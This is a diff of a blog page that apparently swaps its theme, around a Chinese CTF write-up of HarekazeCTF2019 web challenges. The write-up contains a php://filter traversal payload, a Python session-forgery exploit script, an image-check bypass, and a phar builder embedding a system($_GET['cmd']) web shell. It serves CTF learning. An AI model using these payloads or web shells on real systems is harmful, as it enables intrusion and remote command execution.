@@ -1,26 +1,11 @@
 <!DOCTYPE html>
-<html>
+<html lang=zh>
 <head>
-    
-
-    
-
-    
-
-
-
+    <!-- so meta -->
     <meta charset="utf-8">
-    
-    
-    
-    
-    <title>HarekazeCTF2019 | WEB题解 | osword&#39;s blog | 小刀</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-    
-    <meta name="theme-color" content="#3F51B5">
-    
-    
-    <meta name="keywords" content="CTF">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
     <meta name="description" content="前言日常精准复现CTF encode_and_encode考点：编码json转义unicode编码绕过 题解：https:&#x2F;&#x2F;ctftime.org&#x2F;writeup&#x2F;15459 https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;6628 12345678910111213141516171819202122232425262728293031323334353637383940 &lt;?phper">
 <meta property="og:type" content="article">
 <meta property="og:title" content="HarekazeCTF2019 | WEB题解">
@@ -60,176 +45,142 @@
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://zhzhdoai.github.io/2019/11/08/HarekazeCTF2019-WEB%E9%A2%98%E8%A7%A3/1573041252425.png">
     
-        <link rel="alternate" type="application/atom+xml" title="osword&#39;s blog" href="/atom.xml">
     
-    <link rel="shortcut icon" href="/favicon.ico">
-    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
-    <script>window.lazyScripts=[]</script>
-
-    <!-- custom head -->
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
     
+    <!-- title -->
+    <title>HarekazeCTF2019 | WEB题解</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
 
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="osword&#39;s blog" type="application/atom+xml" />
+    
 <meta name="generator" content="Hexo 4.2.1"></head>
 
-<body>
-    <div id="loading" class="active"></div>
-
-    <aside id="menu" class="hide" >
-  <div class="inner flex-row-vertical">
-    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
-        <i class="icon icon-lg icon-close"></i>
-    </a>
-    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
-      <div class="brand">
-        <a href="/" class="avatar waves-effect waves-circle waves-light">
-          <img src="/img/avatar.jpg">
-        </a>
-        <hgroup class="introduce">
-          <h5 class="nickname">osword</h5>
-          <a href="mailto:929337105@qq.com" title="929337105@qq.com" class="mail">929337105@qq.com</a>
-        </hgroup>
-      </div>
-    </div>
-    <div class="scroll-wrap flex-col">
-      <ul class="nav">
-        
-            <li class="waves-block waves-effect">
-              <a href="/"  >
-                <i class="icon icon-lg icon-home"></i>
-                主页
-              </a>
-            </li>
-        
-            <li class="waves-block waves-effect">
-              <a href="/archives"  >
-                <i class="icon icon-lg icon-archives"></i>
-                Archives
-              </a>
-            </li>
-        
-            <li class="waves-block waves-effect">
-              <a href="https://zhzhdoai.github.io/"  >
-                <i class="icon icon-lg icon-友链"></i>
-                友链
-              </a>
-            </li>
-        
-            <li class="waves-block waves-effect">
-              <a href="https://glotozz.github.io/" target="_blank" rel="noopener"  >
-                <i class="icon icon-lg icon-glotozz"></i>
-                Glotozz
-              </a>
-            </li>
-        
-            <li class="waves-block waves-effect">
-              <a href="https://nikoeurus.github.io/" target="_blank" rel="noopener"  >
-                <i class="icon icon-lg icon-sommus"></i>
-                Sommus
-              </a>
-            </li>
-        
-            <li class="waves-block waves-effect">
-              <a href="https://mochazz.github.io/" target="_blank" rel="noopener"  >
-                <i class="icon icon-lg icon-mochazz@七月火"></i>
-                Mochazz 七月火
-              </a>
-            </li>
-        
-            <li class="waves-block waves-effect">
-              <a href="https://tea9.xyz/" target="_blank" rel="noopener"  >
-                <i class="icon icon-lg icon-tea9"></i>
-                Tea 9
-              </a>
-            </li>
-        
-            <li class="waves-block waves-effect">
-              <a href="https://wulidecade.cn/" target="_blank" rel="noopener"  >
-                <i class="icon icon-lg icon-Decade"></i>
-                Decade
-              </a>
-            </li>
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
         
       </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2019/11/12/2019%E6%B9%96%E6%B9%98%E6%9D%AFweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2019/11/04/%E5%AF%B9%E7%8E%B0%E4%BB%A3WEB%E6%A1%86%E6%9E%B6-CMS%E5%AE%A1%E8%AE%A1%E6%80%9D%E8%80%83/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zhzhdoai.github.io/2019/11/08/HarekazeCTF2019-WEB%E9%A2%98%E8%A7%A3/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://zhzhdoai.github.io/2019/11/08/HarekazeCTF2019-WEB%E9%A2%98%E8%A7%A3/&text=HarekazeCTF2019 | WEB题解" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zhzhdoai.github.io/2019/11/08/HarekazeCTF2019-WEB%E9%A2%98%E8%A7%A3/&title=HarekazeCTF2019 | WEB题解" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zhzhdoai.github.io/2019/11/08/HarekazeCTF2019-WEB%E9%A2%98%E8%A7%A3/&is_video=false&description=HarekazeCTF2019 | WEB题解" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HarekazeCTF2019 | WEB题解&body=Check out this article: http://zhzhdoai.github.io/2019/11/08/HarekazeCTF2019-WEB%E9%A2%98%E8%A7%A3/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://zhzhdoai.github.io/2019/11/08/HarekazeCTF2019-WEB%E9%A2%98%E8%A7%A3/&title=HarekazeCTF2019 | WEB题解" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://zhzhdoai.github.io/2019/11/08/HarekazeCTF2019-WEB%E9%A2%98%E8%A7%A3/&title=HarekazeCTF2019 | WEB题解" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zhzhdoai.github.io/2019/11/08/HarekazeCTF2019-WEB%E9%A2%98%E8%A7%A3/&title=HarekazeCTF2019 | WEB题解" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://zhzhdoai.github.io/2019/11/08/HarekazeCTF2019-WEB%E9%A2%98%E8%A7%A3/&title=HarekazeCTF2019 | WEB题解" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zhzhdoai.github.io/2019/11/08/HarekazeCTF2019-WEB%E9%A2%98%E8%A7%A3/&name=HarekazeCTF2019 | WEB题解&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://zhzhdoai.github.io/2019/11/08/HarekazeCTF2019-WEB%E9%A2%98%E8%A7%A3/&t=HarekazeCTF2019 | WEB题解" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
     </div>
-  </div>
-</aside>
-
-    <main id="main">
-        <header class="top-header" id="header">
-    <div class="flex-row">
-        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
-          <i class="icon icon-lg icon-navicon"></i>
-        </a>
-        <div class="flex-col header-title ellipsis">HarekazeCTF2019 | WEB题解</div>
-        
-        <div class="search-wrap" id="search-wrap">
-            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
-                <i class="icon icon-lg icon-chevron-left"></i>
-            </a>
-            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
-            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
-                <i class="icon icon-lg icon-search"></i>
-            </a>
-        </div>
-        
-        
-        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
-            <i class="icon icon-lg icon-share-alt"></i>
-        </a>
-        
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#encode-and-encode"><span class="toc-number">2.</span> <span class="toc-text">encode_and_encode</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#easy-notes"><span class="toc-number">3.</span> <span class="toc-text">easy_notes</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HarekazeCTF2019-Avatar-Uploader-1"><span class="toc-number">4.</span> <span class="toc-text">[HarekazeCTF2019]Avatar Uploader 1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HarekazeCTF2019-Avatar-Uploader-2"><span class="toc-number">5.</span> <span class="toc-text">[HarekazeCTF2019]Avatar Uploader 2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#利用"><span class="toc-number">5.1.</span> <span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Sqlite-Voting"><span class="toc-number">6.</span> <span class="toc-text">Sqlite Voting</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#利用-1"><span class="toc-number">6.1.</span> <span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#总结"><span class="toc-number">7.</span> <span class="toc-text">总结</span></a></li></ol>
     </div>
-</header>
-<header class="content-header post-header">
-
-    <div class="container fade-scale">
-        <h1 class="title">HarekazeCTF2019 | WEB题解</h1>
-        <h5 class="subtitle">
-            
-                <time datetime="2019-11-08T07:52:53.000Z" itemprop="datePublished" class="page-time">
-  2019-11-08
-</time>
-
-
-            
-        </h5>
-    </div>
+  </span>
+</div>
 
     
-
-
-</header>
-
-
-<div class="container body-wrap">
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
     
-    <aside class="post-widget">
-        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
-            <h4>TOC</h4>
-            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#前言"><span class="post-toc-number">1.</span> <span class="post-toc-text">前言</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#encode-and-encode"><span class="post-toc-number">2.</span> <span class="post-toc-text">encode_and_encode</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#easy-notes"><span class="post-toc-number">3.</span> <span class="post-toc-text">easy_notes</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#HarekazeCTF2019-Avatar-Uploader-1"><span class="post-toc-number">4.</span> <span class="post-toc-text">[HarekazeCTF2019]Avatar Uploader 1</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#HarekazeCTF2019-Avatar-Uploader-2"><span class="post-toc-number">5.</span> <span class="post-toc-text">[HarekazeCTF2019]Avatar Uploader 2</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#利用"><span class="post-toc-number">5.1.</span> <span class="post-toc-text">利用</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Sqlite-Voting"><span class="post-toc-number">6.</span> <span class="post-toc-text">Sqlite Voting</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#利用-1"><span class="post-toc-number">6.1.</span> <span class="post-toc-text">利用</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#总结"><span class="post-toc-number">7.</span> <span class="post-toc-text">总结</span></a></li></ol>
-        </nav>
-    </aside>
+    <h1 class="posttitle" itemprop="name headline">
+        HarekazeCTF2019 | WEB题解
+    </h1>
 
 
-<article id="post-HarekazeCTF2019-WEB题解"
-  class="post-article article-type-post fade" itemprop="blogPost">
 
-    <div class="post-card">
-        <h1 class="post-card-title">HarekazeCTF2019 | WEB题解</h1>
-        <div class="post-meta">
-            <time class="post-time" title="2019-11-08 15:52:53" datetime="2019-11-08T07:52:53.000Z"  itemprop="datePublished">2019-11-08</time>
-
-            
-
-
-            
-<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
-    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
-</span>
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">osword's blog</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-11-08T07:52:53.000Z" itemprop="datePublished">2019-11-08</time>
+        
+      
+    </div>
 
 
-        </div>
-        <div class="post-content" id="post-content" itemprop="postContent">
-            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>日常精准复现CTF</p>
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/CTF/" rel="tag">CTF</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>日常精准复现CTF</p>
 <h1 id="encode-and-encode"><a href="#encode-and-encode" class="headerlink" title="encode_and_encode"></a>encode_and_encode</h1><p>考点：编码json转义unicode编码绕过</p>
 <p>题解：<a href="https://ctftime.org/writeup/15459" target="_blank" rel="noopener">https://ctftime.org/writeup/15459</a></p>
 <p><a href="https://xz.aliyun.com/t/6628" target="_blank" rel="noopener">https://xz.aliyun.com/t/6628</a></p>
@@ -239,14 +190,7 @@
 <p>利用json转义格式\u00(url编码字符)绕过</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">. &#x3D;&gt; \u002e      F &#x3D;&gt; \u0066</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./1573041252425.png" alt="1573041252425" title="">
-                </div>
-                <div class="image-caption">1573041252425</div>
-            </figure>
-
+<p><img src="./1573041252425.png" alt="1573041252425"></p>
 <p>最终paylaod</p>
 <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"page"</span>: <span class="string">"php://filter/convert.base64-encode/resource=\u002e\u002e/\u002e\u002e/\u002e\u002e/\u002e\u002e/\u0066lag"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
@@ -254,95 +198,26 @@
 
 <h1 id="easy-notes"><a href="#easy-notes" class="headerlink" title="easy_notes"></a>easy_notes</h1><p>考点：session反序列化</p>
 <p>export.php,会使用ZipArchive或PharData创建文件并写入note内容(可控)。再看生成的filename方法get_user()返回注册的用户名。且这里过了了<code>..</code>无法遍历目录。文件内容会通过回显示头带入</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./1573114337001.png" alt="1573114337001" title="">
-                </div>
-                <div class="image-caption">1573114337001</div>
-            </figure>
-
+<p><img src="./1573114337001.png" alt="1573114337001"></p>
 <p>$note值会将传入的$title、$body压入$_SESSION[‘notes’]数组</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./1573112891671.png" alt="1573112891671" title="">
-                </div>
-                <div class="image-caption">1573112891671</div>
-            </figure>
-
+<p><img src="./1573112891671.png" alt="1573112891671"></p>
 <p>flag.php,得到flag需要得到验证函数is_admin</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="/media/osword/081D145C081D145C/%E5%A4%87%E4%BB%BD/Nutstore%20Files/Typora/ctf/HarekazeCTF2019.assets/1573114568489.png" alt="1573114568489" title="">
-                </div>
-                <div class="image-caption">1573114568489</div>
-            </figure>
-
+<p><img src="/media/osword/081D145C081D145C/%E5%A4%87%E4%BB%BD/Nutstore%20Files/Typora/ctf/HarekazeCTF2019.assets/1573114568489.png" alt="1573114568489"></p>
 <p>这里需要$_SESSION[‘admin’]==true是个布尔值</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./1573114654589.png" alt="1573114654589" title="">
-                </div>
-                <div class="image-caption">1573114654589</div>
-            </figure>
-
+<p><img src="./1573114654589.png" alt="1573114654589"></p>
 <p>考点明显是通过后端解析引擎差异对session进行反序列化。伪造session文件sess_axxxxxxx，写入<code>|N;admin|b:1;</code>，在以该文件名除去sess_作为cookie去访问flag文件触发反序列化，成功伪造admin身份，得到flag</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">URL = <span class="string">'http://b745d7be-e0af-433d-9670-7c5b773aa47b.node3.buuoj.cn/'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># login as sess_</span></span><br><span class="line">sess = requests.Session()</span><br><span class="line">sess.post(URL + <span class="string">'login.php'</span>, data=&#123;</span><br><span class="line">    <span class="string">'user'</span>: <span class="string">'sess_aaaa'</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># make a crafted note</span></span><br><span class="line">sess.post(URL + <span class="string">'add.php'</span>, data=&#123;</span><br><span class="line">    <span class="string">'title'</span>: <span class="string">'name|s:3:"456";admin|b:1;'</span>,</span><br><span class="line">    <span class="string">'body'</span>: <span class="string">'hello'</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># make a fake session</span></span><br><span class="line">r = sess.get(URL + <span class="string">'export.php?type=.'</span>).headers[<span class="string">'Content-Disposition'</span>]</span><br><span class="line">sessid = re.findall(<span class="string">r'sess_([0-9a-z-]+)'</span>, r)[<span class="number">0</span>]</span><br><span class="line">  <span class="comment"># get the flag</span></span><br><span class="line">r = requests.get(URL + <span class="string">'?page=flag'</span>, cookies=&#123;</span><br><span class="line">    <span class="string">'PHPSESSID'</span>: sessid</span><br><span class="line">&#125;)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./1573116094276.png" alt="1573116094276" title="">
-                </div>
-                <div class="image-caption">1573116094276</div>
-            </figure>
-
-
-
+<p><img src="./1573116094276.png" alt="1573116094276"></p>
 <h1 id="HarekazeCTF2019-Avatar-Uploader-1"><a href="#HarekazeCTF2019-Avatar-Uploader-1" class="headerlink" title="[HarekazeCTF2019]Avatar Uploader 1"></a>[HarekazeCTF2019]Avatar Uploader 1</h1><p>关键代码如下</p>
 <p>分别使用finfo_file和getimagesize判断文件类型很是奇怪，考虑执行差异。</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./1573125060507.png" alt="1573125060507" title="">
-                </div>
-                <div class="image-caption">1573125060507</div>
-            </figure>
-
-
-
+<p><img src="./1573125060507.png" alt="1573125060507"></p>
 <p>传入如下文件</p>
 <p>本地测试时候发现finfo可以读取到类型，但是getimagesize无法识别，利用此绕过<code>$size[2] !== IMAGETYPE_PNG</code></p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./1573125130532.png" alt="1573125130532" title="">
-                </div>
-                <div class="image-caption">1573125130532</div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./1573125144393.png" alt="1573125144393" title="">
-                </div>
-                <div class="image-caption">1573125144393</div>
-            </figure>
-
+<p><img src="./1573125130532.png" alt="1573125130532"></p>
+<p><img src="./1573125144393.png" alt="1573125144393"></p>
 <p>flag</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./1573125218861.png" alt="1573125218861" title="">
-                </div>
-                <div class="image-caption">1573125218861</div>
-            </figure>
-
-
-
+<p><img src="./1573125218861.png" alt="1573125218861"></p>
 <h1 id="HarekazeCTF2019-Avatar-Uploader-2"><a href="#HarekazeCTF2019-Avatar-Uploader-2" class="headerlink" title="[HarekazeCTF2019]Avatar Uploader 2"></a>[HarekazeCTF2019]Avatar Uploader 2</h1><p>考点：代码审计、phar反序列化、函数缺陷</p>
 <p>hint:<a href="https://www.php.net/manual/ja/function.password-hash.php" target="_blank" rel="noopener">https://www.php.net/manual/ja/function.password-hash.php</a></p>
 <p>upload.php：中FLAG1已经在upload1 利用结束</p>
@@ -352,118 +227,30 @@
 
 
 <p>再看sign方法中password_hash函数对第一个参数长度超过72会截断，也暗示着如果超出72字节的部分加密后的结果与72字节相同</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./1573129972732.png" alt="1573129972732" title="">
-                </div>
-                <div class="image-caption">1573129972732</div>
-            </figure>
-
+<p><img src="./1573129972732.png" alt="1573129972732"></p>
 <p>再看error方法，$message赋值到$session设置中，输出之后的data值是超过72字节</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./1573130886081.png" alt="1573130886081" title="">
-                </div>
-                <div class="image-caption">1573130886081</div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./1573130861491.png" alt="1573130861491" title="">
-                </div>
-                <div class="image-caption">1573130861491</div>
-            </figure>
-
+<p><img src="./1573130886081.png" alt="1573130886081"></p>
+<p><img src="./1573130861491.png" alt="1573130861491"></p>
 <p>一处可以利用的点，include可以触发phar包写一句话木马</p>
 <p>可以向theme键value值替换为需要包含的文件路径,在加上error方法导致的长度大于72，可以控制data部分值，并且绕过签名验证。</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./1573129102382.png" alt="1573129102382" title="">
-                </div>
-                <div class="image-caption">1573129102382</div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./1573129084102.png" alt="1573129084102" title="">
-                </div>
-                <div class="image-caption">1573129084102</div>
-            </figure>
-
+<p><img src="./1573129102382.png" alt="1573129102382"></p>
+<p><img src="./1573129084102.png" alt="1573129084102"></p>
 <h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>phar包构造,需要构造$png_header绕过upload.php两个图片验证，写入exp.css文件带有一句话木马</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52</span></span><br><span class="line">$png_header = hex2bin(<span class="string">'89504e470d0a1a0a0000000d49484452000000400000004000'</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">'exp.phar'</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;addFromString(<span class="string">'exp.css'</span>, <span class="string">'&lt;?php system($_GET["cmd"]); ?&gt;'</span>);</span><br><span class="line">$phar-&gt;setStub($png_header . <span class="string">'&lt;?php __HALT_COMPILER(); ?&gt;'</span>);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./1573189902248.png" alt="1573189902248" title="">
-                </div>
-                <div class="image-caption">1573189902248</div>
-            </figure>
-
+<p><img src="./1573189902248.png" alt="1573189902248"></p>
 <p>上传该phar包</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./1573189920227.png" alt="1573189920227" title="">
-                </div>
-                <div class="image-caption">1573189920227</div>
-            </figure>
-
+<p><img src="./1573189920227.png" alt="1573189920227"></p>
 <p>赋值新生成的session，进行进一步伪造，增加theme键</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./1573190007834.png" alt="1573190007834" title="">
-                </div>
-                <div class="image-caption">1573190007834</div>
-            </figure>
-
+<p><img src="./1573190007834.png" alt="1573190007834"></p>
 <p>替换原来的data值,index.php包含之，就能够执行命令</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./1573190100617.png" alt="1573190100617" title="">
-                </div>
-                <div class="image-caption">1573190100617</div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./1573189601089.png" alt="1573189601089" title="">
-                </div>
-                <div class="image-caption">1573189601089</div>
-            </figure>
-
+<p><img src="./1573190100617.png" alt="1573190100617"></p>
+<p><img src="./1573189601089.png" alt="1573189601089"></p>
 <p><strong>flag</strong></p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./1573189633670.png" alt="1573189633670" title="">
-                </div>
-                <div class="image-caption">1573189633670</div>
-            </figure>
-
-
-
-
-
+<p><img src="./1573189633670.png" alt="1573189633670"></p>
 <h1 id="Sqlite-Voting"><a href="#Sqlite-Voting" class="headerlink" title="Sqlite Voting"></a>Sqlite Voting</h1><p>考点：逻辑报错、sql注入、sqlite、过滤绕过</p>
 <p>sqlite函数列表：<a href="https://www.sqlite.org/lang_corefunc.html" target="_blank" rel="noopener">https://www.sqlite.org/lang_corefunc.html</a></p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./1573196682665.png" alt="1573196682665" title="">
-                </div>
-                <div class="image-caption">1573196682665</div>
-            </figure>
-
+<p><img src="./1573196682665.png" alt="1573196682665"></p>
 <p>vote.php</p>
